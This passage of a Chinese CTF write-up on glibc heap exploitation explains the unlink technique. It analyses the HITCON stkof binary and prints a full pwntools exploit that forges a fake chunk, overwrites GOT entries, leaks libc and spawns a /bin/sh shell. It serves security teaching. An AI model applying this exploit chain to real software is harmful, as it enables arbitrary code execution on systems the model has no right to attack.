+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ptr指向要free的chunk的头部（即prev_size的位置）</span><br><span class="line">FD &#x3D; ptr-&gt;fd</span><br><span class="line">BK &#x3D; ptr-&gt;bk</span><br><span class="line">FD-&gt;bk &#x3D; BK-&gt;FD &#x3D; ptr</span><br><span class="line">&#x2F;&#x2F; 绕过 将ptr指向的chunk的fd内容修改为&amp;ptr - 0x18，bk内容修改为&amp;ptr - 0x10</span><br><span class="line">FD &#x3D; ptr-&gt;fd &#x3D; &amp;ptr - 0x18</span><br><span class="line">BK &#x3D; ptr-&gt;bk &#x3D; &amp;ptr - 0x10</span><br><span class="line">                    +---------------+</span><br><span class="line">   			ptr --&gt; |   prev_size   |</span><br><span class="line">                    +---------------+</span><br><span class="line">                    |      size     |</span><br><span class="line">                    +---------------+</span><br><span class="line">             fd --&gt; |  &amp;ptr - 0x18  |</span><br><span class="line">                    +---------------+</span><br><span class="line">             bk --&gt; |  &amp;ptr - 0x10  |</span><br><span class="line">                    +---------------+</span><br><span class="line"></span><br><span class="line">FD-&gt;bk &#x3D; *((&amp;ptr - 0x18) + 0x18) &#x3D; BK-&gt;fd &#x3D; *((&amp;ptr - 0x10) + 0x10) &#x3D; ptr</span><br><span class="line">&#x2F;&#x2F; 在64bit中，取chunk的fd指针就是chunk_ptr + 0x10，取chunk的bk指针就是chunk_ptr + 0x18</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ptr1-&gt;fd和ptr2.fd的不同：</span><br><span class="line">ptr1是一个chunk指针，ptr2是一个chunk结构体</span><br><span class="line">ptr1-&gt;fd &#x3D;&#x3D;&gt; *(ptr1+0x18)</span><br><span class="line">ptr2.fd &#x3D;&#x3D;&gt; *(&amp;ptr2+0x18)</span><br></pre></td></tr></table></figure>
+<p>unlink之后修改chunk的fd和bk指针：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk &#x3D; BK &#x3D;&#x3D;&gt; ptr &#x3D; &amp;ptr - 0x10 &#x2F;&#x2F; 先修改next_chunk的bk指针</span><br><span class="line">BK-&gt;fd &#x3D; FD &#x3D;&#x3D;&gt; ptr &#x3D; &amp;ptr - 0x18 &#x2F;&#x2F; 后修改prev_chunk的fd指针</span><br></pre></td></tr></table></figure>
+<p>通过上面的绕过方法，最终实现unlink的利用效果是使ptr的值修改为&amp;ptr-0x18。需要注意的是ptr指向的是chunk的头部，也就是prev_size的位置，如果指向chunk的数据域，也就是fd指针的位置，利用起来就很麻烦甚至没办法绕过检查，只能先将ptr-0x10，再尝试绕过，效果还是一样，ptr-0x10位置的值变成&amp;(ptr-0x10)-0x18，但是ptr的值还是没有变，不能产生啥效果。</p>
+<h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#2014-hitcon-stkof">2014 HITCON stkof</a></h3><p><strong>保护：</strong></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220228163915926.png"></p>
+<p><strong>架构：x86_64</strong></p>
+<p><strong>主要功能：</strong>程序根据输入的选项选择对应的功能：</p>
+<table>
+<thead>
+<tr>
+<th align="center">option</th>
+<th align="center">function</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">malloc_chunk()</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">write_in_chunk()</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">free_chunk()</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">useless()</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int option; &#x2F;&#x2F; eax</span><br><span class="line">  int result; &#x2F;&#x2F; [rsp+Ch] [rbp-74h]</span><br><span class="line">  char input[104]; &#x2F;&#x2F; [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  alarm(0x78u);</span><br><span class="line">  while ( fgets(input, 10, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    option &#x3D; atoi(input);</span><br><span class="line">    if ( option &#x3D;&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; edit_chunk();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( option &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( option &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        result &#x3D; free_chunk();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( option &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        result &#x3D; useless();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( option &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; malloc_chunk();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    result &#x3D; -1;</span><br><span class="line">LABEL_14:</span><br><span class="line">    if ( result )</span><br><span class="line">      puts(&quot;FAIL&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;OK&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>malloc chunk</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 malloc_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line">  char *chunk_ptr; &#x2F;&#x2F; [rsp+8h] [rbp-78h]</span><br><span class="line">  char input[104]; &#x2F;&#x2F; [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v4; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(input, 16, stdin);</span><br><span class="line">  size &#x3D; atoll(input);</span><br><span class="line">  chunk_ptr &#x3D; (char *)malloc(size);</span><br><span class="line">  if ( !chunk_ptr )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  (&amp;chunks)[++index] &#x3D; chunk_ptr;</span><br><span class="line">  printf(&quot;%d\n&quot;, (unsigned int)index);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 申请chunk，输入size，程序malloc size大小的chunk；所有的chunk指针都会存放到bss段的一个chunks数组中，最后输出chunk的数组索引；</p>
+</li>
+<li><p>write_in_chunk</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 edit_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  int i; &#x2F;&#x2F; eax</span><br><span class="line">  unsigned int index; &#x2F;&#x2F; [rsp+8h] [rbp-88h]</span><br><span class="line">  __int64 count; &#x2F;&#x2F; [rsp+10h] [rbp-80h]</span><br><span class="line">  char *chunk_ptr; &#x2F;&#x2F; [rsp+18h] [rbp-78h]</span><br><span class="line">  char input[104]; &#x2F;&#x2F; [rsp+20h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v6; &#x2F;&#x2F; [rsp+88h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(input, 16, stdin);</span><br><span class="line">  index &#x3D; atol(input);</span><br><span class="line">  if ( index &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !(&amp;chunks)[index] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  fgets(input, 16, stdin);</span><br><span class="line">  count &#x3D; atoll(input);</span><br><span class="line">  chunk_ptr &#x3D; (&amp;chunks)[index];</span><br><span class="line">  for ( i &#x3D; fread(chunk_ptr, 1uLL, count, stdin); i &gt; 0; i &#x3D; fread(chunk_ptr, 1uLL, count, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_ptr +&#x3D; i;</span><br><span class="line">    count -&#x3D; i;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( count )</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  else</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 向chunk中写入数据，先输入要写入的chunk的索引，然后输入要写入的数据大小，因为这里的count大小可控，所以存在<strong>堆溢出</strong>；fread函数每次向chunk_ptr中读入一个字节的数据，并返回已读入的数据大小；</p>
+</li>
+<li><p>free_chunk</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int index; &#x2F;&#x2F; [rsp+Ch] [rbp-74h]</span><br><span class="line">  char input[104]; &#x2F;&#x2F; [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(input, 16, stdin);</span><br><span class="line">  index &#x3D; atol(input);</span><br><span class="line">  if ( index &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !(&amp;chunks)[index] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  free((&amp;chunks)[index]);</span><br><span class="line">  (&amp;chunks)[index] &#x3D; 0LL;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 根据输入的索引free chunk，并将chunks数组中的chunk指针置为0；由于没有清空释放的chunk的内容，所以存在<strong>UAF</strong>；</p>
+</li>
+<li><p>useless</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 useless()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int index; &#x2F;&#x2F; [rsp+Ch] [rbp-74h]</span><br><span class="line">  char s[104]; &#x2F;&#x2F; [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(s, 16, stdin);</span><br><span class="line">  index &#x3D; atol(s);</span><br><span class="line">  if ( index &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !(&amp;chunks)[index] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( strlen((&amp;chunks)[index]) &lt;&#x3D; 3 )</span><br><span class="line">    puts(&quot;&#x2F;&#x2F;TODO&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;...&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 这个函数没有多大作用。</p>
+</li>
+</ol>
+<p><strong>漏洞利用：</strong></p>
+<p>所有chunk的指针都存放到chunks数组中，因为unlink可以将变量的值减小0x18，所以想利用unlink将chunks数组中某一项chunks[x]中的值变为&amp;chunks[x]-0x18，这样edit chunks[x]时，就是在修改chunks数组中的内容，通过可以修改chunks数组中的所有项。</p>
+<p>利用过程：<strong>注意chunks数组的下标从1开始，chunks[0]没有使用</strong></p>
+<ol>
+<li> 利用unlink修改chunks[1]=&amp;chunks[1]-0x18，只需要伪造一个chunk，fd填入&amp;chunks[1]-0x18，bk填入&amp;chunks[1]-0x10，并且将伪造的chunk标记为free chunk（修改next_chunk的prev_in_use位），再free next_chunk（chunk 2），触发unlink，unlink之后chunks[1]就指向&amp;chunks[1]-0x18；</li>
+<li> edit chunk1，即修改chunks数组的项，因为chunks[1]=&amp;chunks[1]-0x18，修改<code>chunks[0] = elf.got[&#39;free&#39;], chunks[1] = elf.got[&#39;puts&#39;], chunks[2] = elf.got[&#39;atoi&#39;]</code>；</li>
+<li> edit chunk0，其实是修改chunks[0]指向的地方，因为chunks[0]指向free的got表，所以edit chunk0就是修改free的got表，将其修改为puts函数的plt表地址（puts@plt），这样调用free的时候就会跳到puts@plt执行，然后再跳到puts@got指向的puts函数执行；free chunk1，泄露puts@got；</li>
+<li> edit chunk2，修改chunks[2]，即修改atoi@got为system函数的地址，然后再将/bin/sh字符串输入给atoi函数（option = atoi(input);），即执行system(“/bin/sh”)。</li>
+</ol>
+<p>问题：</p>
+<ol>
+<li><p>为什么要写got表，不写plt表？</p>
+<p> got表可写，plt表不可写；</p>
+<p> <img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220302191500643.png"></p>
+</li>
+<li><p>泄露是泄露got表地址，覆盖是将got表覆盖为plt表的地址？</p>
+<p> 泄露是got表地址：在第二次调用函数时，got表中存放的是函数的地址；程序会jmp到got表指向的地址处执行：jmp *0xaaaaaaa；</p>
+<p> 覆盖是plt表的地址：plt表中是指向一条jmp指令，直接jmp到got表指向的地址执行，got表里面就是一个地址，里面不是指令，直接jmp过去不能执行，需要jmp *取里面的指令地址跳转过去才能执行，plt表中存放的是指令的地址，跳转过去就能直接执行。</p>
+</li>
+</ol>
+<p>具体过程：</p>
+<p>因为程序没有使用setbuf设置输入输出的缓冲区，当程序有输入输出的时候，会自己malloc堆块来作为输入输出缓冲区。程序在调用fgets和puts时，会分别申请一个0x410大小的chunk。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220302213649166.png"></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220302213749683.png"></p>
+<p>为了在后续的利用中不受缓冲区chunk的影响，先让程序把缓冲区申请好，意思就是执行一遍fgets和puts函数，一开始运行程序的时候，随便输入一个数字选项（1-4之外的），让while循环走一遍，while循环一遍之后，fgets函数和puts函数都执行一遍了，就申请好了上面两个缓冲区的chunk。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(&quot;0&quot;)</span><br><span class="line">io.recvuntil(&quot;FAIL\n&quot;)</span><br></pre></td></tr></table></figure>
+<p>申请chunk1和chunk2，并修改chunk1，因为要修改chunks[1] = &amp;chunks[1] - 0x18，通过前面的分析，要修改chunks[1]的值，需要chunks[1]指向chunk的头部（prev_size的位置），所以需要编辑chunk1的时候在chunks[1]指针处伪造一个chunk，修改fd为&amp;chunks[1]-0x18，bk为&amp;chunks[1]-0x10；然后通过堆溢出修改next_chunk的prev_size和prev_inuse位，将chunk1中伪造的chunk标记为free chunk，然后free chunk2，触发unlink。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">malloc_chunk(0x20)</span><br><span class="line">malloc_chunk(0x80) # small bin chunk</span><br><span class="line"></span><br><span class="line"># chunks[1] point to a fake chunk&#39;s head of prev_size</span><br><span class="line">payload &#x3D; p64(0) # fake chunk&#39;s prev_size</span><br><span class="line">payload +&#x3D; p64(0x21) # fake chunk&#39;s size</span><br><span class="line">payload +&#x3D; p64(chunks_addr + 0x08 - 0x18) # fake chunk&#39;s fd</span><br><span class="line">payload +&#x3D; p64(chunks_addr + 0x08 - 0x10) # fake chunk&#39;s bk</span><br><span class="line">payload +&#x3D; p64(0x20) # next_chunk&#39;s prev_size</span><br><span class="line">payload +&#x3D; p64(0x90) # next_chunk&#39;s size, flag of prev_in_use &#x3D; 0</span><br><span class="line">edit_chunk(1, len(payload), payload)</span><br><span class="line"></span><br><span class="line">free_chunk(2) # trigger unlink, chunks[1] &#x3D; &amp;chunks[1] - 0x18 &#x3D; chunks - 0x10</span><br><span class="line">io.recvuntil(&quot;OK\n&quot;)</span><br></pre></td></tr></table></figure>
+<p>unlink之后就可以通过edit chunk1来修改chunks数组的各个项，这里修改<code>chunks[0] = elf.got[&#39;free&#39;], chunks[1] = elf.got[&#39;puts&#39;], chunks[2] = elf.got[&#39;atoi&#39;]</code>；然后再修改chunks[0]，也就是修改free的got表中的内容，将其修改为puts@plt，再free chunk1，就相当于执行puts(puts@got)，泄露puts函数的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39; * 0x10</span><br><span class="line">payload +&#x3D; p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;puts&#39;]) + p64(elf.got[&#39;atoi&#39;])</span><br><span class="line">edit_chunk(1, len(payload), payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">edit_chunk(0, len(payload), payload)</span><br><span class="line">free_chunk(1)</span><br></pre></td></tr></table></figure>
+<p>通过泄露的puts函数的地址可以计算出libc基址，然后edit chunk2，将atoi函数的got表内容修改为system函数的地址，然后再send “/bin/sh”字符串，这样执行atoi(input)就是在执行system(“/bin/sh”)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">payload &#x3D; p64(system_addr)</span><br><span class="line">edit_chunk(2, len(payload), payload)</span><br><span class="line">io.sendline(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io &#x3D; process(&quot;.&#x2F;stkof&quot;)</span><br><span class="line">#io &#x3D; gdb.debug([&#39;.&#x2F;stkof&#39;], &quot;b *0x400C58&quot;)</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;stkof&quot;)</span><br><span class="line"></span><br><span class="line">def malloc_chunk(size):</span><br><span class="line">	io.sendline(&quot;1&quot;)</span><br><span class="line">	io.sendline(str(size))</span><br><span class="line">	io.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def edit_chunk(index, count, content):</span><br><span class="line">	io.sendline(&quot;2&quot;)</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line">	io.sendline(str(count))</span><br><span class="line">	io.send(content)</span><br><span class="line">	io.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">def free_chunk(index):</span><br><span class="line">	io.sendline(&quot;3&quot;)</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line">	#io.recvuntil(&quot;OK\n&quot;) # 注意这里不能要接收，因为后面需要接受执行free后泄露的地址，所以不在函数里面接收</span><br><span class="line"></span><br><span class="line">chunks_addr &#x3D; 0x602140 # chunks数组的基地址</span><br><span class="line"></span><br><span class="line">io.sendline(&quot;0&quot;)</span><br><span class="line">io.recvuntil(&quot;FAIL\n&quot;) # 先执行一遍while循环，让程序申请输入输出缓冲区的chunk</span><br><span class="line"></span><br><span class="line">malloc_chunk(0x20)</span><br><span class="line">malloc_chunk(0x80) # small bin chunk</span><br><span class="line"></span><br><span class="line"># chunks[1] point to a fake chunk&#39;s head of prev_size</span><br><span class="line">payload &#x3D; p64(0) # prev_size</span><br><span class="line">payload +&#x3D; p64(0x21) # size</span><br><span class="line">payload +&#x3D; p64(chunks_addr + 0x08 - 0x18)</span><br><span class="line">payload +&#x3D; p64(chunks_addr + 0x08 - 0x10)</span><br><span class="line">payload +&#x3D; p64(0x20)</span><br><span class="line">payload +&#x3D; p64(0x90) # flag of prev_in_use &#x3D; 0</span><br><span class="line">edit_chunk(1, len(payload), payload)</span><br><span class="line"></span><br><span class="line">free_chunk(2) # trigger unlink, chunks[1] &#x3D; &amp;chunks[1] - 0x18 &#x3D; chunks - 0x10</span><br><span class="line">io.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x10</span><br><span class="line"># chunks[0] &#x3D; elf.got[&#39;free&#39;], chunks[1] &#x3D; elf.got[&#39;puts&#39;], chunks[2] &#x3D; elf.got[&#39;atoi&#39;]</span><br><span class="line">payload +&#x3D; p64(elf.got[&#39;free&#39;]) + p64(elf.got[&#39;puts&#39;]) + p64(elf.got[&#39;atoi&#39;])</span><br><span class="line">edit_chunk(1, len(payload), payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">edit_chunk(0, len(payload), payload)</span><br><span class="line">free_chunk(1)</span><br><span class="line"></span><br><span class="line">puts_addr &#x3D; u64(io.recvuntil(&#39;\nOK\n&#39;, drop&#x3D;True).ljust(8, &#39;\x00&#39;)) </span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">payload &#x3D; p64(system_addr)</span><br><span class="line">edit_chunk(2, len(payload), payload)</span><br><span class="line">io.sendline(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>对于unlink的利用都是在向前合并中，需要修改的指针指向一个fake chunk的prev_size，利用堆溢出将其标记为free状态，如果next_chunk属于small bin的chunk，在free(next_chunk)的时候就会触发unlink。</p>
+<h3 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2">2016 ZCTF note2</a></h3><h3 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#2017-insomnihack-wheelofrobots">2017 insomni’hack wheelofrobots</a></h3><h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><h3 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training lab 10 hacknote"></a><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">HITCON-training lab 10 hacknote</a></h3><p>程序有三个功能：</p>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220124225310733.png" style="zoom:200%;">
+
+<p><strong>Add note</strong></p>
